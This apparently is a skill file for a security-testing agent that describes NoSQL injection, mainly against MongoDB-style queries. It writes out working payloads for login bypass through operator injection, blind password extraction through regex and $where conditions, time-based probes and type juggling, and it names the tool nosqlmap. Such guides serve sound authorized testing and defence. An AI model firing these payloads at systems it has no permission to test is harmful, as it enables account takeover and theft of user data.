---
name: nosql_injection
description: NoSQL injection — operator injection, auth bypass, blind boolean/time
lanes: [nosqli, nosql]
cwe: [943, 89, 74]
capec: [676]
---

# NoSQL Injection

User input reaches a NoSQL query (MongoDB, CouchDB, Redis, Elasticsearch) as an operator or expression rather than a value.

## Attack surface
JSON bodies and query params feeding Mongo-style queries: login, search, filter, `find`/`where`. Especially where the app passes the request object straight into the query.

## Validate (PoC — the proof)
- **Operator injection (auth bypass):** send `{"user":"admin","pass":{"$ne":null}}` or `{"$gt":""}` where a string was expected → if login succeeds or the filter returns everything, confirmed. Query-string form: `user[$ne]=&pass[$ne]=`.
- **Boolean-blind:** `{"$where":"this.pass.length>0"}` / regex `{"pass":{"$regex":"^a"}}` — flip a condition true/false and diff the response (extract chars via regex). Two responses flipping on a condition = proof.
- **Time-blind:** `{"$where":"sleep(5000)||true"}` (capped, repeated trials).
- **Type juggling:** array vs string (`user[]=x`), object vs scalar; JSON `{"a":1,"a":2}` duplicate keys.
- **Elasticsearch/Redis:** query-DSL injection, Lucene syntax, `_search` with crafted queries.

## Safe-confirm
Prove auth bypass on your own test flow, or a boolean flip / operator effect — don't extract real user data at scale.

## Tools
`nosqlmap` (detect mode), Python `requests` for operator payloads in JSON + bracket-param form, the sqli skill's boolean/time methodology applied to NoSQL operators.
